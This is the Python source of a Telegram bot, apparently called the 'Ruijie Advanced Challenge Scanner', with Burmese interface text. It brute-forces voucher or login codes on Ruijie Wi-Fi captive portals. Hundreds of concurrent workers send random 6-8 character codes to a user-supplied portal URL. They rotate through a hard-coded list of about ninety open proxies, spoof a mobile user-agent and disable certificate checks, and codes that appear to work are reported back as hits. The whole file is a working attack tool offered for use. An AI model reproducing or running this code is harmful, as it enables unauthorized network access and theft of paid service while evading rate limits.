import os
import logging
import asyncio
import aiohttp
import random
import string
import time
from urllib.parse import urlparse, parse_qs
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

EMBEDDED_PROXIES = [
    "103.77.173.125:9486", "160.19.16.101:8181", "172.210.12.8:3128", "41.33.245.139:1976",
    "41.128.77.76:1981", "41.128.77.76:1976", "178.92.72.154:8080", "154.201.126.44:8080",
    "178.92.72.149:8080", "178.92.72.54:8080", "178.92.72.134:8080", "45.194.3.132:8080",
    "172.236.242.244:3128", "150.241.245.249:8080", "15.235.145.229:1081", "8.219.97.248:80",
    "102.208.228.90:3128", "184.75.221.82:3118", "68.183.22.37:10000", "43.98.172.166:3128",
    "27.185.218.213:17981", "45.194.90.194:8080", "178.92.72.194:8080", "120.232.115.57:17981",
    "45.195.105.20:8080", "202.154.19.50:3125", "116.101.13.84:10001", "156.240.114.210:3129",
    "150.241.245.131:8080", "123.253.145.165:8080", "103.168.44.83:8081", "34.43.46.91:80",
    "43.165.191.196:1082", "178.92.72.94:8080", "116.196.150.180:17981", "154.201.127.230:8080",
    "178.92.72.162:8080", "178.92.72.129:8080", "4.194.233.145:3128", "34.43.46.91:443",
    "45.194.41.70:8080", "45.194.41.141:8080", "154.201.126.245:8080", "43.156.227.68:80",
    "43.155.62.157:443", "111.196.31.120:8888", "34.131.37.209:40001", "13.59.172.95:3128",
    "111.192.49.90:8888", "113.45.195.147:3128", "102.208.228.90:8080", "111.192.40.90:8888",
    "159.89.87.80:10000", "160.19.18.243:8080", "103.35.156.208:8080", "2.28.105.45:8888",
    "110.44.115.83:8080", "103.193.144.81:8080", "45.194.41.16:8080", "178.92.72.165:8080",
    "178.92.72.73:8080", "45.194.3.119:8080", "124.105.79.237:8080", "45.43.60.220:8080",
    "38.51.207.104:8080", "119.28.233.241:3128", "178.92.72.68:8080", "34.101.229.7:80",
    "103.180.119.182:8082", "45.194.41.155:8080", "149.71.241.164:8080", "45.194.41.103:8080",
    "165.225.113.220:11589", "38.47.176.92:80", "68.183.224.109:3128", "103.82.92.104:2406",
    "41.128.90.53:1981", "180.149.44.182:3128", "14.242.19.156:2001", "36.50.56.237:8080",
    "103.183.8.135:8080", "61.245.9.172:5050", "103.183.8.139:8080", "192.232.48.18:8181",
    "45.194.90.225:8080", "103.146.38.53:1080", "102.203.101.77:8080", "220.128.223.136:8081",
    "43.156.248.220:80", "103.247.14.138:7778", "160.22.207.95:8082"
]

def load_proxies_from_file():
    return EMBEDDED_PROXIES

scanning_states = {}
user_modes = {}
user_workers = {}
user_portals = {}
user_proxies = {}
proxy_indices = {}
found_codes = {}
current_codes_tracker = {}
tried_counters = {}
expired_counters = {}
limits_counters = {}

def show_startup_banner():
    print("=" * 65)
    print("  ⚡  RUIJIE ADVANCED CHALLENGE SCANNER  ⚡")
    print("=" * 65)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in user_modes:
        user_modes[chat_id] = "num6"
    if chat_id not in user_workers:
        user_workers[chat_id] = 200
    if chat_id not in user_proxies or not user_proxies[chat_id]:
        user_proxies[chat_id] = load_proxies_from_file()
    if chat_id not in proxy_indices:
        proxy_indices[chat_id] = 0
        
    total_proxies = len(user_proxies.get(chat_id, []))
    
    keyboard = [
        [InlineKeyboardButton("🌐 Update Portal Link", callback_data="update_portal")],
        [InlineKeyboardButton("⚙️ Mode", callback_data="change_mode")],
        [InlineKeyboardButton(f"🔧 Workers: {user_workers[chat_id]}", callback_data="change_workers")],
        [InlineKeyboardButton(f"🔀 Proxies: {total_proxies}", callback_data="add_proxies")],
        [InlineKeyboardButton("🚀 Start Scanner By Kage", callback_data="start_scanner")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = (
        "⚡ Ruijie Advanced Portal Scanner ⚡\n\n"
        f"⚙ Current Mode: {user_modes[chat_id]}\n"
        f"🔧 Workers: {user_workers[chat_id]}\n"
        f"🔀 Proxies Loaded: {total_proxies}"
    )
    
    if update.message:
        await update.message.reply_text(text, reply_markup=reply_markup)
    elif update.callback_query:
        try:
            await update.callback_query.message.edit_text(text, reply_markup=reply_markup)
        except Exception:
            pass

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    chat_id = query.message.chat_id
    data = query.data
    
    if data == "update_portal":
        await query.answer()
        context.user_data['waiting_for'] = 'portal'
        await query.message.reply_text("🔗 Ruijie Portal URL အပြည့်အစုံကို ထည့်ပေးပါ:")
    
    elif data == "change_mode":
        await query.answer()
        keyboard = [
            [InlineKeyboardButton("Num 6", callback_data="mode_num6"), InlineKeyboardButton("Num 7", callback_data="mode_num7"), InlineKeyboardButton("Num 8", callback_data="mode_num8")],
            [InlineKeyboardButton("Abc 6", callback_data="mode_abc6"), InlineKeyboardButton("Mix6", callback_data="mode_mix6")],
            [InlineKeyboardButton("🔙 Back", callback_data="mode_back")]
        ]
        await query.message.edit_text("⚙ Choose Scanner Mode", reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data.startswith("mode_"):
        await query.answer()
        selected_mode = data.replace("mode_", "")
        if selected_mode == "back":
            await start(update, context)
        else:
            user_modes[chat_id] = selected_mode
            await start(update, context)
            
    elif data == "change_workers":
        await query.answer()
        keyboard = [
            [InlineKeyboardButton("100", callback_data="worker_100"), InlineKeyboardButton("200", callback_data="worker_200")],
            [InlineKeyboardButton("500", callback_data="worker_500"), InlineKeyboardButton("🔙 Back", callback_data="worker_back")]
        ]
        await query.message.edit_text("⚙️ Choose Worker Count", reply_markup=InlineKeyboardMarkup(keyboard))
        
    elif data.startswith("worker_"):
        await query.answer()
        selected = data.replace("worker_", "")
        if selected == "back":
            await start(update, context)
        else:
            user_workers[chat_id] = int(selected)
            await start(update, context)

    elif data == "add_proxies":
        user_proxies[chat_id] = load_proxies_from_file()
        await query.answer("Proxies reloaded!")
        await start(update, context)
    
    elif data == "start_scanner":
        await query.answer()
        portal = user_portals.get(chat_id)
        if not portal:
            await query.message.reply_text("⚠️ ပထမဦးစွာ Portal URL ကို အရင်ထည့်ပါ။")
            return
        if scanning_states.get(chat_id, False):
            await query.message.reply_text("⚠ စကင်န်ဖတ်ခြင်း လုပ်ဆောင်ဆဲ ဖြစ်ပါသည်။")
            return
        asyncio.create_task(run_scanner_with_workers(query, context, portal))
        
    elif data == "stop_scanner_btn":
        await query.answer("🛑 ရပ်တန့်နေပါပြီ...")
        scanning_states[chat_id] = False

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    text = update.message.text.strip()
    if context.user_data.get('waiting_for') == 'portal':
        user_portals[chat_id] = text
        context.user_data['waiting_for'] = None
        await update.message.reply_text("✅ Portal URL သိမ်းဆည်းပြီးပါပြီ။")
        await start(update, context)

def generate_code_by_mode(mode):
    length = 6
    for char in mode:
        if char.isdigit():
            length = int(char)
            break
    if "num" in mode:
        return "".join(random.choices(string.digits, k=length))
    elif "mix" in mode:
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))
    elif "abc" in mode:
        return "".join(random.choices(string.ascii_lowercase, k=length))
    return "".join(random.choices(string.digits, k=length))

async def worker_task(worker_id, session, portal_url, chat_id):
    parsed_url = urlparse(portal_url)
    query_params = parse_qs(parsed_url.query)
    
    # URL ထဲက ပါပြီးသား Parameter များကို ထုတ်ယူခြင်း
    base_endpoint = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    
    base_params = {}
    for key, val in query_params.items():
        base_params[key] = val[0]
        
    base_params["stage"] = "login"

    while scanning_states.get(chat_id, False):
        mode = user_modes.get(chat_id, "num6")
        code_val = generate_code_by_mode(mode)
        tried_counters[chat_id] = tried_counters.get(chat_id, 0) + 1
        current_codes_tracker[chat_id] = code_val
        
        proxies_list = user_proxies.get(chat_id, [])
        proxy = None
        if proxies_list:
            idx = (proxy_indices.get(chat_id, 0) + worker_id) % len(proxies_list)
            proxy = proxies_list[idx]
            
        if proxy and not proxy.startswith("http"):
            proxy = f"http://{proxy}"
            
        try:
            # Ruijie လက်ခံသည့် Param ပုံစံအတိုင်း ပို့ဆောင်ခြင်း
            payload_params = base_params.copy()
            payload_params["token"] = code_val
            payload_params["password"] = code_val
            payload_params["code"] = code_val

            headers = {
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15"
            }
            
            async with session.get(base_endpoint, params=payload_params, headers=headers, proxy=proxy, timeout=3.0) as response:
                text_content = await response.text()
                lower_text = text_content.lower()
                
                is_real_hit = (
                    response.status == 200 and
                    any(k in lower_text for k in ["success", "authenticated", "auth_pass", "login successfully", "\"code\":200", "\"status\":1"]) and
                    not any(e in lower_text for e in ["error", "fail", "invalid", "expired", "wrong", "incorrect"])
                )
                
                if is_real_hit:
                    if chat_id not in found_codes:
                        found_codes[chat_id] = []
                    if code_val not in found_codes[chat_id]:
                        found_codes[chat_id].append(code_val)
                elif any(kw in lower_text for kw in ["expired", "invalid", "timeout", "used", "incorrect", "wrong"]):
                    expired_counters[chat_id] = expired_counters.get(chat_id, 0) + 1
                elif any(kw in lower_text for kw in ["limit", "already logged", "in use", "too many", "blocked"]):
                    limits_counters[chat_id] = limits_counters.get(chat_id, 0) + 1
        except Exception:
            pass
        await asyncio.sleep(0.001)

async def run_scanner_with_workers(query, context, portal_url):
    chat_id = query.message.chat_id
    scanning_states[chat_id] = True
    found_codes[chat_id] = []
    tried_counters[chat_id] = 0
    expired_counters[chat_id] = 0
    limits_counters[chat_id] = 0
    
    start_time = time.time()
    workers_count = user_workers.get(chat_id, 200)
    
    stop_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop", callback_data="stop_scanner_btn")]])
    status_message = await query.message.reply_text("⚡ Challenge Scanner Running ...\nBy Telegram @Kage", reply_markup=stop_keyboard)
    
    connector = aiohttp.TCPConnector(limit=workers_count, limit_per_host=workers_count, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(worker_task(i, session, portal_url, chat_id)) for i in range(workers_count)]
        
        while scanning_states.get(chat_id, False):
            await asyncio.sleep(1.0)
            tried = tried_counters.get(chat_id, 0)
            expired = expired_counters.get(chat_id, 0)
            limits = limits_counters.get(chat_id, 0)
            elapsed = time.time() - start_time
            speed = (tried / elapsed * 60) if elapsed > 0 else 0.0
            hits_list = found_codes.get(chat_id, [])
            
            hits_str = "\n".join([f"🔥 {code} | Valid" for code in hits_list[-5:]]) if hits_list else "None yet"
            
            live_text = (
                "⚡ Challenge Scanner Running ⚡\n"
                "By Telegram @Kage\n\n"
                f"🏹 Tried: {tried:,}\n"
                f"🎯 Current Code: {current_codes_tracker.get(chat_id, '000000')}\n"
                f"🔥 Real Hits: {len(hits_list)}\n"
                f"❌ Expired: {expired}\n"
                f"⚠️ Limits: {limits}\n"
                f"⚡ Speed: {speed:,.1f} c/m\n"
                "___________________\n"
                f"🔥 Verified Hit Codes:\n{hits_str}"
            )
            try:
                await status_message.edit_text(live_text, reply_markup=stop_keyboard)
            except Exception:
                pass
        for t in tasks:
            t.cancel()

    final_hits = found_codes.get(chat_id, [])
    final_text = f"🛑 စကင်န်ဖတ်ခြင်း ပြီးဆုံးပါပြီ။\n\n"
    if final_hits:
        final_text += "🔥 Verified Hit Codes Found:\n" + "\n".join(final_hits)
    else:
        final_text += "ℹ️ စစ်မှန်သော Code အစစ်အမှန် မတွေ့ရှိသေးပါ။"
    await query.message.reply_text(final_text)

def main():
    show_startup_banner()
    token = os.environ.get("BOT_TOKEN")
    if not token:
        print("Error: BOT_TOKEN missing in Secrets.")
        return
    app = ApplicationBuilder().token(token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
    app.run_polling()

if __name__ == '__main__':
    main()
        
